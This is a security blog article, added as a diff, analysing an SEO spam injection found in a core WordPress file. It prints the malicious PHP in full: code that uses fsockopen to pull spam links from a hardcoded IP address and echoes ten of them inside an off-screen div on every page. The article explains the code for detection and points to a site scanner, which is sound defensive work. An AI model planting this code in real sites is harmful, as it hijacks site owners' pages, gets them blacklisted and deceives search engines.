@@ -1,0 +1,47 @@
+Hidden SEO Spam Link Injections on WordPress Sites
+
+Often when a website is injected with SEO spam, the owner is completely unaware of the issue until they begin to receive warnings from search engines or blacklists.
+This is by design — attackers intentionally try to prevent detection by arranging injected links so they are not visible to average human traffic.
+No SEO spam visible to human traffic, but it exists out of sight.
+One of the techniques attackers use is to “push” the injected SEO spam links off the visible portion of the website. This way, humans won’t see the spam links, but crawling bots that read the HTML of the website will — and these SEO spam links will be attributed to your website.
+How the injection works
+Found injected into the core WordPress file wp-includes/general-template.php, this PHP injection works by using fsockopen to open a connection to the $host variable, which contains the URL to the SEO spam infrastructure.
+In response to an attacker’s GET request, this URL provides the actual spam links and stores it in the $response variable, then closes the connection.
+$host = '164.68.108.113';
+$file = 'example.txt';
+
+$response = '';
+$fs = fsockopen($host, 80, $errno, $errstr, 10);
+
+if ($fs) {
+$out = "GET /{$file} HTTP/1.1\r\n";
+$out .= "Host: {$host}\r\n";
+$out .= "Connection: Close\r\n\r\n";
+fwrite($fs, $out);
+stream_set_timeout($fs, 10);
+while(!feof($fs) && ($debug = fgets($fs)) != "\r\n" );
+
+while (!feof($fs)) {
+$response .= fgets($fs, 4096);
+}
+fclose($fs);
+}
+
+Once the injection has the SEO spam links saved to the $response variable, it can include them with the div styling position: absolute and left: -110055px to “push” the spam links out of sight on the web page.
+This malware uses other various PHP functions like count(), shuffle(), and array_slice() to sort through the SEO spam links saved to the $response, then selects 10 of the SEO spam links and injects it into the web page by a simple echo.
+Since wp-includes/general-template.php is loaded with every WordPress page, it is easy for the attacker to ensure that a steady flow of SEO spam links are available for injection through the infected file.
+echo "<div style='position: absolute; bottom: 0px; left: -11055px;'>";
+if ($response) {
+$links = explode("\n", $response);
+
+if (count($links)) {
+shuffle($links);
+$links = array_slice($links, 0, 10);
+foreach ($links as $link) {
+echo "\r$link" ;
+}
+}
+}
+echo "</div>";
+
+While these types of hidden spam link injections are not easy for a human to visually identify, they can be detected by a remote site scanning tool like SiteCheck. This service will scan your website’s external source code to help you detect security issues, malware, infected files, or blacklist status.
